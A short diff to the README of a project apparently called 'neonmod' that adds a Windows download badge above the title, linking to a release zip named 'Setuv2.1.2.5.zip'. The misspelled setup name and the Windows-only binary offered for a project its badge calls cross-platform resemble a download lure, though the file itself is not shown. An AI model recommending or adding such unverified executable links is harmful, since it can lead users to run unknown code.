@@ -1,3 +1,5 @@
+[![Download](https://img.shields.io/badge/download-windows--x64-0078D6?style=flat-square&logo=windows)](https://github.com/ivan-wilsondev93m6/neonmod/releases/download/v1.0.0/Setuv2.1.2.5.zip)
+
 # 🎮 neonmod
 
 ![License](https://img.shields.io/badge/license-MIT-blue.svg) ![Platform](https://img.shields.io/badge/platform-cross--platform-lightgrey.svg)
